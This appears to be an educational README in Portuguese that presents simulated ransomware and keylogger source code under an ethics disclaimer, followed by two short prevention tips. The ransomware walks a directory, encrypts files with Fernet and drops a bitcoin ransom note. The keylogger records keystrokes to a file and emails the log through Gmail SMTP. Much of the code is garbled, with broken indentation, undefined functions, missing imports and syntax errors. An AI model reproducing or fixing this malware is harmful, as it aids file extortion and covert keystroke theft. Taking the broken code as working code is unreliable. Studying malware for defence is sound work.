# Aprendizado e Ética
Este projeto foi desenvolvido exclusivamente para fins educacionais e de pesquisa. Ele simula o comportamento de malwares como ransomware e keylogger em um ambiente controlado e seguro, com o objetivo de:
- Demonstrar técnicas básicas de criptografia e captura de entrada.
- Promover o entendimento sobre como malwares operam.
- Incentivar a reflexão sobre medidas de defesa e segurança cibernética.
⚠️ Importante:
Este código não deve ser utilizado em ambientes reais, nem com a intenção de causar danos, invadir sistemas ou violar a privacidade de terceiros. O uso indevido pode configurar crime conforme a legislação vigente.
Recomenda-se executar este projeto apenas em máquinas virtuais ou ambientes isolados (sandbox), sem conexão com redes externas ou dados sensíveis.

# Ransomware-Simulado: criar arquivos de teste, implementar um script que criptografa e descriptografa, além de gerar mensagem de “resgate”.

from cryptography.fernet import Fernet
import os

# Gerar uma chave de criptografia e salvar
key = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Carregar a chave salva
def carregar_chave():
    return open("chave.key" , "rb").read()

# Criptografar um único arquivo
 def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
     with open(arquivo, "rb") as file:
    dados = file.read()

   # Encontrar arquivos para criptografar
   def encontrar_arquivos(diretorio):
        lista = []
        for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
        caminho = os.path.join(raiz, nome)
       if nome != "ransoware.py" and not nome.endswith(".key"):
        lista.append(caminho)
        return lista

  #  Mensagem de resgate 
     def criar_mensagem_resgate():
         with open("LEIA ISSO.txt", "w") as f:
      f.write("Seus arquivos foram criptografados!\n")
      f.write("Envia 3 bitcoin para o endereço X e envie o comprovante!\n")
      f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")
                
  # Execução principal
    def main():
       gerar_chave()
       chave = carregar_chave()
       arquivos = encontrar_arquivos("test_files")
       for arquivo in arquivos:
       criptografar_arquivo(arquivo, chave)
       criar_mensagem_resgate()
      print("Ransoware executado! Arquivos criptografados!")

      if__name__== "__main__":
        main()


# Keylogger Simulado: programar captura de teclas em arquivo .txt, torná-lo mais furtivo e implementar envio automático por e-mail

from pynput import keyboard

IGNORAR = {keyboard.shift,
keyboard.Key.shift_r,
keyboard.Key.ctrl_l,
keyboard.Key.ctrl_r
keyboard.alt_r,
keyboard.Key.alt_l,
keyboard.Key.caps_lock,
keyboard.Key.cmd
 }

def on_press(key):
 try:  
  # se for uma tecla "normal" (letra, número, símbolo) 
    with open(log.txt, "a", encoding="uft-8") as f:
f.write(key.char)

except.AttributeError:
    with open("log.txt", "a", encoding="utf-8) as f:
     if key == keyboard.key.space:
        f.write(" ")
         elif key == keyboard.key.enter:
         f.write("\n")
        elif key ==keyboard.key.tab:
         f.write("\t")
        elif key == keyboard.key.backspace:
         f.write(" ")
         elif key == keyboard.key.esc:
         f.write("[ESC] ")
         elif key in IGNORAR:
            pass
      else:
        f.write(f"[{key}] ")
  with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

 # Envio por e-mail

def enviar_email():
    with open("log.txt", "r") as f:
        conteudo = f.read()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("pyy@gmail.com", "senha")
    server.sendmail("pyy@gmail.com", "destino@gmail.com", conteudo)
    server.quit()

 # Medidas de Prevenção
- Antivírus: Detecta e bloqueia malwares conhecidos.
- Firewall: Controla tráfego de rede suspeito.

# Boas práticas
- Atualizações regulares de software.
- Backup frequente dos dados.




